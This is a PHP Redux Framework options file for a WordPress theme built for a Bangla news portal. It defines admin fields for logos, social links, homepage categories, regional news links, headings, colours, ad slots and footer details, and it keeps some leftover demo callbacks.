<?php
if (!class_exists('Redux')) {
    return;
}


// This is your option name where all the Redux data is stored.
$opt_name = "redux_demo";

// This line is only for altering the demo. Can be easily removed.
$opt_name = apply_filters('redux_demo/opt_name', $opt_name);

$sampleHTML = '';
if (file_exists(dirname(__FILE__) . '/info-html.html')) {
    Redux_Functions::initWpFilesystem();

    global $wp_filesystem;

    $sampleHTML = $wp_filesystem->get_contents(dirname(__FILE__) . '/info-html.html');
}

// Background Patterns Reader
$sample_patterns_path = ReduxFramework::$_dir . '../sample/patterns/';
$sample_patterns_url  = ReduxFramework::$_url . '../sample/patterns/';
$sample_patterns      = array();

if (is_dir($sample_patterns_path)) {

    if ($sample_patterns_dir = opendir($sample_patterns_path)) {
        $sample_patterns = array();

        while (($sample_patterns_file = readdir($sample_patterns_dir)) !== false) {

            if (stristr($sample_patterns_file, '.png') !== false || stristr($sample_patterns_file, '.jpg') !== false) {
                $name              = explode('.', $sample_patterns_file);
                $name              = str_replace('.' . end($name), '', $sample_patterns_file);
                $sample_patterns[] = array(
                    'alt' => $name,
                    'img' => $sample_patterns_url . $sample_patterns_file
                );
            }
        }
    }
}

$theme = wp_get_theme();

$args = array(
    'opt_name'             => $opt_name,
    'display_name'         => $theme->get('Name'),
    'display_version'      => $theme->get('Version'),
    'menu_type'            => 'menu',
    'allow_sub_menu'       => true,
    'menu_title'           => __('Theme Options', 'redux-framework-demo'),
    'page_title'           => __('Theme Options', 'redux-framework-demo'),
    'google_api_key'       => '',
    'google_update_weekly' => false,
    'async_typography'     => false,
    'admin_bar'            => true,
    'admin_bar_icon'       => 'dashicons-admin-generic',
    'admin_bar_priority'   => 50,
    'global_variable'      => '',
    'dev_mode'             => false,
    'update_notice'        => false,
    'customizer'           => true,
    'page_priority'        => 10,
    'page_parent'          => 'themes.php',
    'page_permissions'     => 'manage_options',
    'menu_icon'            => 'dashicons-admin-generic',
    'last_tab'             => '',
    'page_icon'            => 'icon-themes',
    'page_slug'            => 'redux_demo',
    'save_defaults'        => true,
    'default_show'         => false,
    'default_mark'         => '',
    'show_import_export'   => true,
    'transient_time'       => 60 * MINUTE_IN_SECONDS,
    'output'               => true,
    'output_tag'           => true,
    'database'             => '',
    'use_cdn'              => true,

    // HINTS
    'hints'                => array(
        'icon'          => 'el el-question-sign',
        'icon_position' => 'right',
        'icon_color'    => 'lightgray',
        'icon_size'     => 'normal',
        'tip_style'     => array(
            'color'   => 'red',
            'shadow'  => true,
            'rounded' => false,
            'style'   => '',
        ),
        'tip_position'  => array(
            'my' => 'top left',
            'at' => 'bottom right',
        ),
        'tip_effect'    => array(
            'show' => array(
                'effect'   => 'slide',
                'duration' => '500',
                'event'    => 'mouseover',
            ),
            'hide' => array(
                'effect'   => 'slide',
                'duration' => '500',
                'event'    => 'click mouseleave',
            ),
        ),
    )
);


// SOCIAL ICONS -> Setup custom links in the footer for quick links in your panel footer icons.

$args['share_icons'][] = array(
    'url'   => 'https://facebook.com/ronytarafder99',
    'title' => 'Like us on Facebook',
    'icon'  => 'el el-facebook'
);
$args['share_icons'][] = array(
    'url'   => 'https://twitter.com/rony_tarafder99',
    'title' => 'Follow us on Twitter',
    'icon'  => 'el el-twitter'
);
$args['share_icons'][] = array(
    'url'   => 'https://www.linkedin.com/in/rony-tarafder-1b5434178/',
    'title' => 'Find us on LinkedIn',
    'icon'  => 'el el-linkedin'
);

// Panel Intro text -> before the form
if (!isset($args['global_variable']) || $args['global_variable'] !== false) {
    if (!empty($args['global_variable'])) {
        $v = $args['global_variable'];
    } else {
        $v = str_replace('-', '_', $args['opt_name']);
    }
    $args['intro_text'] = sprintf(__('', 'redux-framework-demo'), $v);
} else {
    $args['intro_text'] = __('', 'redux-framework-demo');
}

// Add content after the form.
$args['footer_text'] = __('<p></p>', 'redux-framework-demo');

Redux::setArgs($opt_name, $args);

$tabs = array(
    array(
        'id'      => 'redux-help-tab-1',
        'title'   => __('Theme Information 1', 'redux-framework-demo'),
        'content' => __('<p>This is the tab content, HTML is allowed.</p>', 'redux-framework-demo')
    ),
    array(
        'id'      => 'redux-help-tab-2',
        'title'   => __('Theme Information 2', 'redux-framework-demo'),
        'content' => __('<p>This is the tab content, HTML is allowed.</p>', 'redux-framework-demo')
    )
);
Redux::setHelpTab($opt_name, $tabs);

// Set the help sidebar
$content = __('<p>This is the sidebar content, HTML is allowed.</p>', 'redux-framework-demo');
Redux::setHelpSidebar($opt_name, $content);

Redux::setSection($opt_name, array(
    'title'            => __('Activation Theme', 'redux-framework-demo'),
    'id'               => 'purchase_theme',
    'icon'             => 'el el-home',
    'fields'           => array(
        array(
            'id'       => 'v_id',
            'type'     => 'password',
            'title'    => __('Theme Purchase code', 'redux-framework-demo'),
            'subtitle' => __('Please Active Your Theme', 'redux-framework-demo'),
            'desc' => __('For activation code Please Contect our Helpline', 'redux-framework-demo'),
            'default'  => '',
        ),
    ),
));
Redux::setSection($opt_name, array(
    'id'   => 'presentation-divide-sample',
    'type' => 'divide',
));
Redux::setSection($opt_name, array(
    'title' => __('header Settings', 'redux-framework-demo'),
    'id'    => 'header',
    'icon'  => 'el el-list-alt',
));
Redux::setSection($opt_name, array(
    'title' => __('Logo Settings'),
    'id'    => 'header-logo_setting',
    'icon'  => 'el el-list-alt',
    'subsection'       => true,
    'fields'     => array(
        array(
            'id'       => 'logo',
            'title'    => __('selection'),
            'type'     => 'media',
        ),
        array(
            'id'     => 'alt',
            'title'    => __('alt for logo'),
            'type'   => 'text',
        ),
        array(
            'id'     => 'width',
            'title'    => __('width for logo'),
            'type'   => 'text',
            'desc'     => __('max width is 450', 'redux-framework-demo'),
            'placeholder' => 'defult is 350',
            'default'  => '350',
        ),
        array(
            'id'     => 'height',
            'title'    => __('height for logo'),
            'type'   => 'text',
            'desc'     => __('max height is 80', 'redux-framework-demo'),
            'placeholder' => 'defult is 60',
            'default'  => '60',
        )
    )
));

Redux::setSection($opt_name, array(
    'title'            => __('Social Links', 'redux-framework-demo'),
    'desc'             => __('Please fill all the social links here ', 'redux-framework-demo'),
    'id'               => 'header-social_links',
    'subsection'       => true,
    'icon'  => 'el el-list-alt',
    'fields'           => array(
        array(
            'id'       => 'facebook',
            'type'     => 'text',
            'title'    => __('Facebook ID link', 'redux-framework-demo'),
            'subtitle' => __('Enter Full ID Link', 'redux-framework-demo'),
            'desc'     => __('Demo: https://facebook.com/ronytarafder99', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'Youtube',
            'type'     => 'text',
            'title'    => __('Youtube Channel link', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Channel Link', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'twitter',
            'type'     => 'text',
            'title'    => __('Twitter ID link', 'redux-framework-demo'),
            'subtitle' => __('Enter Full ID Link', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'instagram',
            'type'     => 'text',
            'title'    => __('instagram Channel link', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Channel Link', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'linkedin',
            'type'     => 'text',
            'title'    => __('linkedin link', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Link', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'podcast',
            'type'     => 'text',
            'title'    => __('podcast link', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Link', 'redux-framework-demo'),
            'desc'     => __('Demo: https://podcasts.google.com/', 'redux-framework-demo'),
            'default'  => '#',
        ),
    )
));

// -> START Marquee
Redux::setSection($opt_name, array(
    'title'  => __('Home Page Setting', 'redux-framework-demo'),
    'id'     => 'home_page',
    'desc'   => __('All Setting For Hime Page, visit: ', 'redux-framework-demo') . '<a href="http://webdeck99.blogspot.com/" target="_blank">Theme Doc</a>',
    'icon'   => 'el el-font',
    'fields' => array(
        array(
            'id'       => 'exclusive_posts',
            'type'     => 'switch',
            'title'    => __('Show Exclusive Posts', 'redux-framework-demo'),
            'subtitle' => __('default is on', 'redux-framework-demo'),
            'default'  => true,
        ),
        array(
            'id'       => 'home_cat_0',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Special Cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_0_text',
            'type'     => 'text',
            'title'    => __('Special Cat Heading', 'redux-framework-demo'),
            'default'  => 'আইসিইউর জন্য হাহাকার',
        ),
        array(
            'id'       => 'home_cat_1',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page Cat One', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_2',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page Cat Two', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_3',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page Cat Three', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_4',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page Cat four', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_5',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page Cat Five', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_6',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page Six Five', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_7',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 7 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_8',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 8 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_9',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 9 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_10',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 10 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_11',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 11 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_12',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 12 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_13',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 13 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_14',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 14 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_15',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 15 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_16',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 16 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),
        array(
            'id'       => 'home_cat_17',
            'type'     => 'select',
            'data'     => 'categories',
            'title'    => __('Home Page 17 cat', 'redux-framework-demo'),
            'subtitle' => __('please select your category', 'redux-framework-demo'),
            'default'  => '1',
            'args'     => array(
                'hide_empty'         => 0,
                'option_none_value' => 1,
                'parent' => 0,
            )
        ),

    )
));

// map link
Redux::setSection($opt_name, array(
    'title'            => __('Map Link', 'redux-framework-demo'),
    'desc'             => __('Please fill all the links here ', 'redux-framework-demo'),
    'id'               => 'map_links',
    'icon'  => 'el el-list-alt',
    'fields'           => array(
        array(
            'id'       => 'map_title',
            'type'     => 'text',
            'title'    => __('Title For Map', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Text', 'redux-framework-demo'),
            'desc'     => __('Demo: এক ক্লিকে বিভাগের খবর ', 'redux-framework-demo'),
            'default'  => 'এক ক্লিকে বিভাগের খবর  
            ',
        ),
        array(
            'id'       => 'rangpur',
            'type'     => 'text',
            'title'    => __('Link For Rangpur', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Link', 'redux-framework-demo'),
            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/rangpur/', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'rajshahi',
            'type'     => 'text',
            'title'    => __('Tlink for Rajshahi', 'redux-framework-demo'),
            'subtitle' => __('Enter Full ID Link', 'redux-framework-demo'),
            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/rajshahi/', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'sylhet',
            'type'     => 'text',
            'title'    => __('link for sylhet', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Channel Link', 'redux-framework-demo'),
            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/sylhet/', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'mymensingh',
            'type'     => 'text',
            'title'    => __('Link For mymensingh', 'redux-framework-demo'),
            'subtitle' => __('Enter Full id Link', 'redux-framework-demo'),
            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/mymensingh/', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'dhaka',
            'type'     => 'text',
            'title'    => __('Link For Dhaka', 'redux-framework-demo'),
            'subtitle' => __('Enter Full id Link', 'redux-framework-demo'),
            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/dhaka/', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'khulna',
            'type'     => 'text',
            'title'    => __('link for khulna', 'redux-framework-demo'),
            'subtitle' => __('Enter Full id Link', 'redux-framework-demo'),
            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/khulna/', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'borishal',
            'type'     => 'text',
            'title'    => __('Link for borishal', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Link', 'redux-framework-demo'),
            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/borishal/', 'redux-framework-demo'),
            'default'  => '#',
        ),
        array(
            'id'       => 'chittagong',
            'type'     => 'text',
            'title'    => __('Link for chittagong', 'redux-framework-demo'),
            'subtitle' => __('Enter Full Link', 'redux-framework-demo'),
            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/chittagong/', 'redux-framework-demo'),
            'default'  => '#',
        ),

    )
));
// Static Text Heading
Redux::setSection($opt_name, array(
    'title'            => __('Text Heading Field', 'redux-framework-demo'),
    'desc'             => __('Please fill all the links here ', 'redux-framework-demo'),
    'id'               => 'Text_heading',
    'icon'  => 'el el-list-alt',
    'fields'           => array(
        array(
            'id'       => 'marguee_name',
            'type'     => 'text',
            'title'    => __('marguee News Heading', 'redux-framework-demo'),
            'desc'     => __('Demo: শিরোনাম', 'redux-framework-demo'),
            'default'  => 'শিরোনাম',
        ),
        array(
            'id'       => 'area_news',
            'type'     => 'text',
            'title'    => __('Area News Heading', 'redux-framework-demo'),
            'desc'     => __('Demo: আপনার এলাকার খবর', 'redux-framework-demo'),
            'default'  => 'আপনার এলাকার খবর',
        ),
        array(
            'id'       => 'photo_name',
            'type'     => 'text',
            'title'    => __('Heading Text photo Slider', 'redux-framework-demo'),
            'desc'     => __('Demo: ফটো গ্যালারি', 'redux-framework-demo'),
            'default'  => 'ফটো গ্যালারি',
        ),
        array(
            'id'       => 'all_news',
            'type'     => 'text',
            'title'    => __('Heading Text All News Btn', 'redux-framework-demo'),
            'desc'     => __('Demo: সবখবর ', 'redux-framework-demo'),
            'default'  => 'সবখবর ',
        ),
        array(
            'id'       => 'more',
            'type'     => 'text',
            'title'    => __('Title For More Text', 'redux-framework-demo'),
            'desc'     => __('Demo:  আরও    ', 'redux-framework-demo'),
            'default'  => 'আরও',
        ),
        array(
            'id'       => 'latest_only',
            'type'     => 'text',
            'title'    => __('Heading For Leatest', 'redux-framework-demo'),
            'desc'     => __('Demo: সর্বশেষ', 'redux-framework-demo'),
            'default'  => 'সর্বশেষ',
        ),
        array(
            'id'       => 'latest_all_only',
            'type'     => 'text',
            'title'    => __('Heading For Leatest all news', 'redux-framework-demo'),
            'desc'     => __('Demo: আজকের সর্বশেষ সবখবর', 'redux-framework-demo'),
            'default'  => 'আজকের সর্বশেষ সবখবর',
        ),
        array(
            'id'       => 'most_read',
            'type'     => 'text',
            'title'    => __('Hading For Most Read', 'redux-framework-demo'),
            'desc'     => __('Demo: পাঠকপ্রিয়', 'redux-framework-demo'),
            'default'  => 'পাঠকপ্রিয়',
        ),
        array(
            'id'       => 'most_read_in_weak',
            'type'     => 'text',
            'title'    => __('Hading For Most Read In Weak', 'redux-framework-demo'),
            'desc'     => __('Demo: এই সপ্তাহের পাঠকপ্রিয়', 'redux-framework-demo'),
            'default'  => 'এই সপ্তাহের পাঠকপ্রিয়',
        ),
        array(
            'id'       => 'read_more',
            'type'     => 'text',
            'title'    => __('Hading For Read More', 'redux-framework-demo'),
            'desc'     => __('Demo: আরও পড়ুন', 'redux-framework-demo'),
            'default'  => 'আরও পড়ুন',
        ),
        array(
            'id'       => 'home_heading',
            'type'     => 'text',
            'title'    => __('Home Heading Text', 'redux-framework-demo'),
            'desc'     => __('Demo: প্রচ্ছদ', 'redux-framework-demo'),
            'default'  => 'প্রচ্ছদ',
        ),
        array(
            'id'       => 'other_heading',
            'type'     => 'text',
            'title'    => __('Other Heading Text', 'redux-framework-demo'),
            'desc'     => __('Demo: অন্যান্য', 'redux-framework-demo'),
            'default'  => 'অন্যান্য',
        ),
    )
));
// -> START Typography
Redux::setSection($opt_name, array(
    'title'  => __('Typography', 'redux-framework-demo'),
    'id'     => 'typography',
    'desc'   => __('For full documentation on this field, visit: ', 'redux-framework-demo') . '<a href="http://webdeck99.blogspot.com/" target="_blank">Theme Doc</a>',
    'icon'   => 'el el-font',
    'fields' => array(
        array(
            'id'       => 'opt-typography-body',
            'type'     => 'typography',
            'title'    => __('Body Font', 'redux-framework-demo'),
            'subtitle' => __('Specify the body font properties.', 'redux-framework-demo'),
            'google'   => true,
            'output' => ('*'),
            'default'  => array(
                'font-family' => 'SolaimanLipi',
            ),
        ),
    )
));
// -> START Design Fields
Redux::setSection($opt_name, array(
    'title' => __('Design Fields', 'redux-framework-demo'),
    'id'    => 'design',
    'desc'  => __('', 'redux-framework-demo'),
    'icon'  => 'el el-wrench'
));

Redux::setSection($opt_name, array(
    'title'      => __('Background', 'redux-framework-demo'),
    'id'         => 'design-background',
    'subsection' => true,
    'fields'     => array(
        array(
            'id'       => 'opt-background1',
            'type'     => 'background',
            'output'   => array('.bottom_header_bg, .leatest_one_video_post, .all-videos , .marquee_name, .footer_three_col'),
            'title'    => __('Background Color', 'redux-framework-demo'),
            'subtitle' => __('Body background with image, color, etc.', 'redux-framework-demo'),
            'default'   => '#b30f0f',
        ),
        array(
            'id'       => 'opt-background2',
            'type'     => 'background',
            'output'   => array('.home_icon:hover, .all-videos:hover, ul.ul_menu li:hover'),
            'title'    => __('Hover Color', 'redux-framework-demo'),
            'subtitle' => __('Body background with image, color, etc.', 'redux-framework-demo'),
            'default'   => '#9a1515',
        ),
        array(
            'id'       => 'opt-switch',
            'type'     => 'switch',
            'title'    => __('Show Footer Scroll Posts', 'redux-framework-demo'),
            'subtitle' => __('default is on', 'redux-framework-demo'),
            'default'  => true,
        ),
        array(
            'id'       => 'opt-background3',
            'type'     => 'background',
            'output'   => array('.marquee_container'),
            'title'    => __('Scroll Posts Background Color', 'redux-framework-demo'),
            'subtitle' => __('Body background with image, color, etc.', 'redux-framework-demo'),
            'default'   => '#10A337',
        ),

    ),
));
// advertisement
Redux::setSection($opt_name, array(
    'title' => __('Advertisements', 'redux-framework-demo'),
    'id'    => 'advertisements',
    'desc'  => 'There are two advertisements options Rest of the advertisements you will find <b>Dashbode>Widgets</b>',
    'icon'  => 'el el-list-alt',
    'fields'     => array(
        array(
            'id'       => 'home_page_top_ad1',
            'type'     => 'editor',
            'title'    => __('Home Page First Ads', 'redux-framework-demo'),
            'subtitle' => __('home page full width banner', 'redux-framework-demo'),
        ),
        array(
            'id'       => 'home_page_2nd_ad',
            'type'     => 'editor',
            'title'    => __('Home Page Second Ads', 'redux-framework-demo'),
            'subtitle' => __('home page Thumb ad show in homepage left', 'redux-framework-demo'),
        ),
        array(
            'id'       => 'home_page_3rd_ad',
            'type'     => 'editor',
            'title'    => __('Home Page Thired Ads', 'redux-framework-demo'),
            'subtitle' => __('home page Thumb ad show in homepage right', 'redux-framework-demo'),
        ),
        array(
            'id'       => 'home_page_4th_ad',
            'type'     => 'editor',
            'title'    => __('Home Page Four Ads', 'redux-framework-demo'),
            'subtitle' => __('home page Thumb ad show in homepage right', 'redux-framework-demo'),
        ),
        array(
            'id'       => 'home_page_5th_ad',
            'type'     => 'editor',
            'title'    => __('Home Page 5th Ads', 'redux-framework-demo'),
            'subtitle' => __('home page Thumb ad', 'redux-framework-demo'),
        ),
        array(
            'id'       => 'home_page_6th_ad',
            'type'     => 'editor',
            'title'    => __('Home Page 5th Ads', 'redux-framework-demo'),
            'subtitle' => __('home page Thumb ad', 'redux-framework-demo'),
        ),
    )
));

// Footer Settings Fields
Redux::setSection($opt_name, array(
    'title' => __('Footer Settings', 'redux-framework-demo'),
    'id'    => 'footer',
    'icon'  => 'el el-list-alt',
));
Redux::setSection($opt_name, array(
    'title' => __('Logo Settings'),
    'id'    => 'footer-footer_logo_setting',
    'icon'  => 'el el-list-alt',
    'subsection'       => true,
    'fields'     => array(
        array(
            'id'       => 'footer_logo',
            'title'    => __('Select Footer Logo'),
            'type'     => 'media',
        ),
        array(
            'id'     => 'footer_logo_alt',
            'title'    => __('alt for logo'),
            'type'   => 'text',
        ),
        array(
            'id'     => 'footer_logo_width',
            'title'    => __('width for logo'),
            'type'   => 'text',
            'desc'     => __('max width is 300', 'redux-framework-demo'),
            'placeholder' => 'defult is 260',
            'default'  => '260',
        ),
        array(
            'id'     => 'footer_logo_height',
            'title'    => __('height for logo'),
            'type'   => 'text',
            'desc'     => __('max height is 75', 'redux-framework-demo'),
            'placeholder' => 'defult is 71',
            'default'  => '71',
        )
    )
));
Redux::setSection($opt_name, array(
    'title' => __('About Settings'),
    'id'    => 'footer-footer_about_setting',
    'icon'  => 'el el-list-alt',
    'subsection'       => true,
    'fields'     => array(
        array(
            'id'       => 'get_our_app',
            'type'     => 'text',
            'title'    => __('App Heading For Mobile', 'redux-framework-demo'),
            'default'  => 'GET THE APP',
        ),
        array(
            'id'       => 'info',
            'type'     => 'editor',
            'title'    => __('Details', 'redux-framework-demo'),
            'default'  => 'Jagonews24.com is one of the popular Bangla news portal. It has begun with commitment of fearless, investigative, informative and independent journalism. This online portal has started to provide real time news updates with maximum use of modern technology from May 10th 2014. Latest & breaking news of home and abroad, entertainment, lifestyle, special reports, politics, economics, culture, education, information technology, health, sports, columns and features are included in it. A genius team of Jago News has been built with a group of countrys energetic young journalists. We are trying to build a bridge with Bengali around the world and adding a new dimension to online news portal. The home of materialistic news.',
        ),
        array(
            'id'       => 'publiser',
            'type'     => 'editor',
            'title'    => __('publiser Details', 'redux-framework-demo'),
            'default'  => 'সম্পাদক ও প্রকাশক: নাজমুল হক শ্যামল',
        ),
        array(
            'id'       => 'opt-switch-dmca',
            'type'     => 'switch',
            'title'    => __('Show DMCA Status', 'redux-framework-demo'),
            'subtitle' => __('default is on', 'redux-framework-demo'),
            'default'  => true,
        ),
        array(
            'id'       => 'dmca',
            'title'    => __('DMCA status Logo'),
            'type'     => 'media',
        ),
        array(
            'id'     => 'footer_dmca_alt',
            'title'    => __('alt for dmca logo'),
            'type'   => 'text',
        ),
        array(
            'id'     => 'footer_dmca_width',
            'title'    => __('width for dmca logo'),
            'type'   => 'text',
            'desc'     => __('max width is 300', 'redux-framework-demo'),
            'placeholder' => 'defult is 200',
            'default'  => '200',
        ),
        array(
            'id'     => 'footer_dmca_height',
            'title'    => __('height for dmca logo'),
            'type'   => 'text',
            'desc'     => __('max height is 50', 'redux-framework-demo'),
            'placeholder' => 'defult is 40',
            'default'  => '40',
        ),
        array(
            'id'       => 'company_info',
            'type'     => 'editor',
            'title'    => __('Comapny Details', 'redux-framework-demo'),
            'default'  => 'বিজয় বাংলা মিডিয়া লিমিটেডের একটি প্রতিষ্ঠান',
        ), array(
            'id'       => 'Contact_info',
            'type'     => 'editor',
            'title'    => __('Contact Details', 'redux-framework-demo'),
            'default'  => '৯৫ সোহরাওয়ার্দী এভিনিউ </br>
            বারিধারা ডিপ্লোমেটিক জোন, ঢাকা ১২১২',
        ),
    )
));

// documentation
Redux::setSection($opt_name, array(
    'title' => __('documentation', 'redux-framework-demo'),
    'id'    => 'select',
    'desc'       => __('For full documentation on this field, visit: ', 'redux-framework-demo') . '<a href="http://webdeck99.blogspot.com/" target="_blank">Visit Our Blog Page</a>',
    'icon'  => 'el el-list-alt',
));
// support
Redux::setSection($opt_name, array(
    'title' => __('Support', 'redux-framework-demo'),
    'id'    => 'support',
    'desc'       => __('If you need help about this theme, You can call: 01889363531</br> Facebook: ', 'redux-framework-demo') . '<a href="https://facebook.com/ronytarafder99" target="_blank">  facebook</a>',
    'subtitle' => __('No validation can be done on this field type', 'redux-framework-demo'),
    'icon'  => 'el el-thumbs-up',
));


// end
if (!function_exists('compiler_action')) {
    function compiler_action($options, $css, $changed_values)
    {
        echo '<h1>The compiler hook has run!</h1>';
        echo "<pre>";
        print_r($changed_values);
        echo "</pre>";
    }
}

/**
 * Custom function for the callback validation referenced above
 * */
if (!function_exists('redux_validate_callback_function')) {
    function redux_validate_callback_function($field, $value, $existing_value)
    {
        $error   = false;
        $warning = false;

        //do your validation
        if ($value == 1) {
            $error = true;
            $value = $existing_value;
        } elseif ($value == 2) {
            $warning = true;
            $value   = $existing_value;
        }

        $return['value'] = $value;

        if ($error == true) {
            $field['msg']    = 'your custom error message';
            $return['error'] = $field;
        }

        if ($warning == true) {
            $field['msg']      = 'your custom warning message';
            $return['warning'] = $field;
        }

        return $return;
    }
}

/**
 * Custom function for the callback referenced above
 */
if (!function_exists('redux_my_custom_field')) {
    function redux_my_custom_field($field, $value)
    {
        print_r($field);
        echo '<br/>';
        print_r($value);
    }
}

/**
 * Custom function for filtering the sections array. Good for child themes to override or add to the sections.
 * Simply include this function in the child themes functions.php file.
 * NOTE: the defined constants for URLs, and directories will NOT be available at this point in a child theme,
 * so you must use get_template_directory_uri() if you want to use any of the built in icons
 * */
if (!function_exists('dynamic_section')) {
    function dynamic_section($sections)
    {
        //$sections = array();
        $sections[] = array(
            'title'  => __('Section via hook', 'redux-framework-demo'),
            'desc'   => __('<p class="description">This is a section created by adding a filter to the sections array. Can be used by child themes to add/remove sections from the options.</p>', 'redux-framework-demo'),
            'icon'   => 'el el-paper-clip',
            // Leave this as a blank section, no options just some intro text set above.
            'fields' => array()
        );

        return $sections;
    }
}

/**
 * Filter hook for filtering the args. Good for child themes to override or add to the args array. Can also be used in other functions.
 * */
